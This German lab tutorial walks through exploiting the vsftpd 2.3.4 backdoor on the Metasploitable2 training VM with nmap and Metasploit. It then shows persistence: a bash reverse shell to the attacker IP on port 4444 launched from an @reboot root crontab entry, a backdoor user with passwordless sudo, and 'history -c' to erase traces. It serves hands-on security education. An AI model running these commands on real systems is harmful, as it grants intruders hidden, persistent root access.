# 🛡️ Red Team Pentesting Routine: vsftpd Exploitation & Backdoor auf Metasploitable2

Die Metasploitable2 ist eine virtuelle Maschine, die absichtlich verwundbare Stellen aufweist. Mit dieser VM lassen sich Werkzeuge wie Metasploit Framework testen.
Wir wollen genau diese Schwachstellen dieser Maschine herausfinden und uns einen Remote Zugriff verschaffen.
Dazu ist es notwendig, dass du Kali Linux, Metasploitable2 sowie pfSense in einer virtuellen Umgebung nutzen kannst. 
Wir haben unser [Labnet](/09-practice-labs/labnet_infos.md) über Virtualbox eingerichtet. Solltest du dies auch tun, gibt es unzählige Guides im Internet, die dir dabei helfen, ein Labnet einzurichten.

Für den Test starten wir über Virtualbox alle drei Maschinen (Kali Linux, Metasploitable2 und pfSense).

## Inhaltsverzeichnis
- [Ziel](#ziel)
- [Testumgebung](#testumgebung)
- [1. Netzwerkerkennung via Nmap](#1-netzwerkerkennung-via-nmap)
- [2. Service-Erkennung](#2-service-erkennung)
- [3. Exploitation mit Metasploit](#3-exploitation-mit-metasploit)
- [4. Zugriff sichern (Backdoor persistieren)](#4-zugriff-sichern-backdoor-persistieren)
- [5. Cleanup & Hinweise](#5-cleanup--hinweise)
- [Zusammenfassung der Schritte](#zusammenfassung-der-schritte)
- [Tools benötigt](#tools-benötigt)
- [Empfehlung](#empfehlung)
- [Haftungsausschluss](#haftungsausschluss)





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Ziel

1. Finde Metasploitable2 im Netzwerk, 
2. nutze eine bekannte Schwachstelle aus, 
3. verschaffe dir Zugriff via `msfconsole` und
4. erstelle eine persistente Backdoor für künftige Zugriffe.





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Testumgebung

- **Angreifer:** Kali Linux (z. B. 192.168.1.100)
- **Zielsystem:** Metasploitable2 (IP wird ermittelt)
- **Firewall/Gateway:** pfSense (z. B. 192.168.1.1)
- **Netzbereich:** 192.168.1.0/24





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 1. Netzwerkerkennung via Nmap

Scanne das Netzwerk, um das Zielsystem zu identifizieren:

```bash
sudo nmap -sP 192.168.1.0/24
```

![Metasploit nmap scan](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd1.png)

Wir scannen bewusst das gesamten Netzwerk mit dem Präfix `/24` und der IP-Adresse `192.168.1.0`, um 
herauszufinden, welche Geräte sich in diesem Netzwerk befinden.

Oben auf dem Bild siehst du 3 Hosts in dem Netzwerk mit der gesuchten IP-Adresse.

Die Hosts sind in meinem Labnet folgende:
1. pfSense Gateway/Firewall
2. Metasploitable2
3. Kali Linux

Dabei suchen wir nach einem Host mit offenen Ports wie 21, 22, 23, 80 usw. – welche typisch sind für 
Metasploitable2.

Angenommen, du findest:
```bash
Nmap scan report for 192.168.1.0/24
Host is up (0.00041s latency).
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
```
Merke dir die IP, z. B. 192.168.1.102.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## 2. Service-Erkennung

Ziel-IP-Adresse scannen mit silent Syn-Paketen und der Versionen:

```bash
nmap -sS -sV 192.168.1.102
```

- **`-sS`:** Dieser Switch scannt tausende Ports in kurzer Zeit und nutzt dabei SYN-Pakete um die Server zu erreichen. Wird auch als `half-open scan` bezeichnet, weil keine ACK stattfindet.
- **`-sV`:** findet heraus, welche Programme den Port belauschen.

Mehr zu SYN und ACK findest du in unserem [TCP-Guide](/02-network-security/grundlagen/tcp_ip_basics.md).

**ODER**

Gezielt den FTP-Port prüfen:

```bash
sudo nmap -sV -p21 192.168.1.102
```
Erwartete Ausgabe:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
Diese Version ist bekannt verwundbar für eine Backdoor-Shell über speziell formatierte Login-Daten.

![nmap Versionsscan](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd2.png)

<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

- **PORT:** Listet alle Ports auf, die mit der IP-Adresse verknüpft sind.
- **STATE:** Zeigt den aktuellen Stand des Ports an.
    - **open:** Offener, aktiver Port = Vulnerabel für Angriffe.
    - **closed:** Geschlossener Port, keine Angriffe möglich.
    - **filtered:** Gefilterter Port / Firewall.
    - **open|filtered:** nmap konnte nicht herausfinden, ob open oder closed bzw. filtered. 
- **SERVICE:** Zeigt den Service an, der auf diesem Port läuft.
- **VERSION:** Zeigt die aktuelle Version des Protokolls.

Hier erfährst du mehr zu den einzelnen States und wie du mit ihnen umgehen kannst: [nmap Offizielle Webseite](https://nmap.org/book/man-port-scanning-basics.html).

**Tipp:** Offene Ports sind angreifbar. Bei offenen/gefilterten Ports musst du einen expliziten Scandurchlauf auf den Port starten. Nur so kannst du herausfinden, 
ob der Port offen oder tatsächlich geschlossen ist. Sollte eine Firewall hinter diesem Port sein, dann wirst du geblockt und kommst nicht mehr rein (Firewall blockiert 
deine IP-Adresse).


In unserem [nmap Guide](/02-network-security/tools/nmap.md) erhältst du mehr Infos.




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 3. Exploitation mit Metasploit

Wenn du möchtest, kannst du ab hier mit einem zweiten Terminal starten, um auf msfconsole zuzugreifen.

### 3.1 msfconsole starten
Starte Metasploit in dem du folgenden Befehl in das Kali Linux Terminal eingibst:
```bash
msfconsole
```

![msfconsole starten](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd3.png)

Nachdem msfconsole erfolgreich gestartet ist, wirst du merken, dass sich die Anzeige geändert hat. Das liegt daran, dass wir nun in der Shell des Programm `msfconsole` sind.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.2 Nach passendem Exploit-Modul suchen

Da wir den `Port 21` angreifen möchten, suchen wir nach der `VERSION`. 
Dabei kannst du einfach nach dem Namen der Version suchen.
Um das passende Exploit-Modul zu suchen, gib einfach in die `msfconsole` folgenden Befehl ein:
```
search vsftpd
```


![Exploit-Modul suchen](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd4.png)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.3 Exploit nutzen

Du siehst ein verfügbares Module, das unserem Suchbegriff entspricht.
Für unsere Backdoor nutzen wir das zweite Exploit-Modul. Um darauf zuzugreifen gibst du einfach folgendes in die `msfconsole`:

```bash
use 1
```
Der Befehl `use` ist selbstaussagend und die `1` steht für die Nummer des Exploits in unserer Liste. Mit `use 1` nutzen wir also das untere Modul, statt dem oberen, das die Nummer `0` hat.

Dein Terminal sollte nun folgendermaßen aussehen:

![Exploit-Modul nutzen](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd5.png)


**Was ist bisher passiert?**

Wir haben mit `nmap` einen Netzwerkscan mit einer bestimmten IP-Adresse gemacht. Das ist natürlich ein Bilderbuchszenario, da wir im normalen Leben keine IP-Adressen unseres gegenübers kennen.

Anschließend haben wir eine `SYN`- und `Version`-Scan durchgeführt, um herauszufinden, welche Ports mit welchen Programmen belegt sind (lauschen).

Schließlich haben wir uns für den Port 21 entschieden, da wir bemerkten, dass die Version anfällig ist für Metasploit Angriffe.

Wir haben `msfconsole` geöffnet und nach der Version gesucht und waren erfolgreich.

**Was jetzt?**



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.4 Exploit Optionen ansehen

Mit dem Befehl `option` siehst du, welche Möglichkeiten du mit diesem Exploit hast. 

![msfconsole option-Befehl](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd6.png)


Für uns sind hier an dieser Stelle nur der `RHOST` und `RPORT` wichtig, da wir nicht über einen Proxy laufen oder sonst locale Clients haben.



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.5 Exploit konfigurieren

Jetzt sepzifizieren wir in msfconsole den `RHOST`, also den Remote Host, und den `RPORT`, also den Remote Port, die wir angreifen möchten.

Gib dazu im msfconsole folgenden Befehl ein, um den RHOST und den RPORT zu konfigurieren:

```bash
set RHOSTS 192.168.1.102
set RPORT 21
```

![msfconsole RHOST und RPORT Konfiguration](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd7.png)

Du könntest noch einmal den Befehl `options` eingeben, um zu überprüfen, ob deine Konfigurationen überommen worden sind, aber dies Bedarf es im Regelfall nicht.

**Bist du bereit?**



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.6 Run that Motherf***

Nutze nun den Befehl `run` oder `exploit`, um den Angriff zu starten. Gib dazu im msfconsole einfach folgenden Befehl ein:

```bash
run
``` 

Wenn alles erfolgreich ist, dann erhältst du folgende Meldung über das Terminal:
```css
[*] Backdoor service has been spawned
[*] Command shell session 1 opened
```
![msfconsole Exploit start](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd8.png)

**Für Fortgeschrittene:**
Wenn du bereits weißt, welchen Exploit du verwenden willst, kannst du das Exploit-Modul direkt auswählen und die Einstellungen vornehmen:

Lade direkt das passende Exploit-Modul:
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.102
set RPORT 21
exploit
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


### 3.7 Exploit überprüfen

Ist dir aufgefallen, dass es so aussieht, als würde dein Terminal nichts mehr tun bzw. noch weiterarbeiten?

Das Terminal, dass du nun siehst, ist das der Metasploitable2 VM. 
Ich möchte dir etwas zeigen, obwohl dieser Schritt überflüssig ist.

Wir haben also mit unserer Kali Linux VM über nmap und msfconsole einen Exploit auf unsere Metasploitable2 gemacht. 

Ja, ich weiß. Nicht sehr spannend und ohne Bluescreens oder Lösegeldzahlungen wie aus Ransomware, aber das ist auch nicht das, worum es hier geht.

Wir haben nun Zugriff auf einen Computer, der potenziell jemand anderem gehören könnte. Ein wildfremder, nichtsahenender Mensch, dessen Daten nun von uns ausspioniert werden können. 

Um dir das zu zeigen, habe ich in Kali in zwei Terminals gearbeitet. In einem habe ich die nmap Scans durchgeführt und in dem anderen habe ich msfconsole gestartet und den Zugriff auf die Metasploitable2 erhalten.

Nun möchte ich dir zeigen, dass wir definitiv über Kali in unserer Metasploitable2 sind, ohne auch nur die Metasploitable2 zu nutzen.

Dazu habe ich in beiden Terminals den Befehl `whoami` eingegeben. Der `whoami`-Befehl zeigt mir, mit welchem User ich mich auf dem Rechner/Maschine/Server befinde.

Kali zeigt mir den folgenden User:
Das heißt, ich bin in meiner Kali Maschine der Nutzer mit dem Name Kali

![Kali whoami](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd9.png)

Metasploitable2 zeigt mir folgende User:
Metasploitable2 hingegen zeigt mir, dass ich der Root Nutzer bin.

![Metasploitable2 whoami](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd10.png)



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## 4. Zugriff sichern (Backdoor persistieren)

Du hast jetzt eine Shell, das bedeutet, dass du Zugriff auf die Client-Software hast.
Ziel ist es nun, eine persistente Backdoor zu installieren. Diese ermöglicht es uns, viele Schritte zu überspringen und direkt auf die Maschine zuzugreifen. 

1. Prüfe zuerst den User-Kontext:
```bash
whoami
```
2. Eine einfache Methode: Erzeuge einen Reverse-Shell Bash-Skript im Autostart:
```bash
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab
```

![Backdoor erstellen](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd11.png)

**Die Befehle aus 2. im Detail**

**Erstellen des Backoor-Skripts:**
`echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" > /tmp/backdoor.sh`
- `echo "..."`: Gibt den Text innerhalb Anführungszeichen in die Konsole aus.
- `bash -i`: startet interaktive Bash-Shell.
- `>& /dev/tcp/192.168.1.100/4444`: Reverse Shell Sitzung mit `bash -i` an eine `TCP`-Verbindung
    - `>`: leitet die Standardausgabe um.
    - `&`: leitet zusätzlich die Standardfehlerausgabe um.
    - `/dev/tcp/`: spezielles Linux-Feature; ermöglicht TCP-Verbindung direkt in der Bash-Shell zu erstellen. Es wird Angreifer-PC `192.168.1.100` auf Port `4444` aufgebaut.
- `0>&1`: Leitet Standardeingabe (`0`) auf Standardausgabe (`1`) um, die bereits an TCP-Verbindung geleitet wird. Dadurch kann Agreifer über Netcat-Sitzung Befehle an Shell senden.
- `> /tmp/backdoor.sh`: leitet gesamte Ausgabe des `echo`-Befehls in neue Datei names `backdoor.sh` im temporären Verzeichnis `/tmp/` um.

**Datei ausführbar machen:**
`chmod +x /tmp/backdoor.sh`
- `chmod`: ändert Zugriffsrechte einer Datei.
    - `+x`: fügt Ausführungsrecht (`execute`) hinzu, entscheiden, da sonst das System das Skript nicht startet.

**Erstellen einer persistenten Aufgabe:**
`echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab`
- `echo "..."`: Gibt den Cron-Job-Eintrag aus.
- `@reboot`: spezielle Zeitangabe in `crontab`-Datei.
    - bedeutet, dass nachfolgender Befehl jedes Mal ausgeführt wird, wenn das System neu gestartet wird.
- `root /tmp/backdoor.sh`: Gibt an, dass der Befehl als `root`-Benutzer ausgeführt werden soll und ruft das Skript `backdoor.sh` auf.
- `>> /etc/crontab`: Hängt den neuen Eintrag am Ende der System-Crontab-Datei an.

**Was der Befehl als Ganzes tut**

Diese Befehlskette automatisiert die Erstellung einer Reverse Shell, die dauerhaft auf dem Zielsystem persistiert. Der Angreifer muss lediglich auf seinem System einen Listener (z. B. mit `nc -lvnp 4444`) starten. Beim nächsten Neustart des infizierten Systems wird die `backdoor.sh` automatisch ausgeführt und stellt die Verbindung zum Angreifer her, der dann vollen Zugriff auf die Shell hat.

Mit dem Befehl `cat /tmp/backdoor.sh` kannst du die Datei anzeigen lassen. Gib dazu einfach im Terminal folgenden Befehl ein:
```
cat /tmp/backdoor.sh
```

![Backdoor-Bash-Script anzeigen](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd13.png)


3. Starte Listener auf Kali:
```bash
nc -lvnp 4444
```

![Backdoor erstellen](/09-practice-labs/ressourcen/pictures/metasploitable2/metasploit-vsftpd12.png)

Beim nächsten Reboot von Metasploitable2 verbindet sich die Shell zu deinem Kali.

**Alternative:** Erstelle einen neuen Benutzer:
```bash
useradd redteam -m -s /bin/bash
echo 'redteam:redpass' | chpasswd
echo "redteam ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```




<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## 5. Cleanup & Hinweise

- Für realistische Tests kann `history -c` verwendet werden, um Spuren zu verwischen.
- Beachte: Metasploitable2 ist absichtlich verwundbar – verwende diese Methoden nicht gegen produktive Systeme.
- Dokumentiere deine Sessions mit script:
```bash
script pentest_session.log
```



<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>

## Zusammenfassung der Schritte

| Schritt | Tool        | Zweck                           |
| ------- | ----------- | ------------------------------- |
| 1       | Nmap        | Netzwerkscan                    |
| 2       | Nmap        | Servicedetektion (vsftpd 2.3.4) |
| 3       | Metasploit  | Exploitation via FTP-Backdoor   |
| 4       | Netcat/Bash | Backdoor persistieren           |
| 5       | Bash        | Optional: Benutzer anlegen      |






<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Tools benötigt

- `nmap`
- `msfconsole (Metasploit Framework)`
- `netcat`
- `bash`
- `cron`
- `Kali Linux VM`
- `pfSense Gateway/Firewall`
- `Metasploitable2`





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Empfehlung

Nutze `iptables` oder `pfSense` Logging, um zu beobachten, wie Angriffe in der Firewall sichtbar werden. 
Dies ist nützlich für spätere Blue Team-Analysen.





<div align=right>

[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)

</div>


## Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

[Disclaimer](/00-disclaimer/disclaimer.md)

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** August 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---
